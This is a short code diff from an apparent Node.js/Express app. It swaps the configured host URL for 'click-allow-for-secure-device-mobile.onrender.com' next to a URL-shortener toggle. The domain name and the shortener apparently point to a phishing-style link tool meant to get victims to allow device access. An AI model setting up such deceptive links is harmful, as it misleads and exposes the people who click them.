@@ -101,7 +101,7 @@ app.set("view engine", "ejs");
 
 //Modify your URL here
 var hostURL =
-  "https://bd65547c-6ba7-471d-a4ea-67f852c40620-00-49s3teyxsn7f.pike.replit.dev";
+  "https://click-allow-for-secure-device-mobile.onrender.com";
 //TOGGLE for Shorters
 var use1pt = false;
 
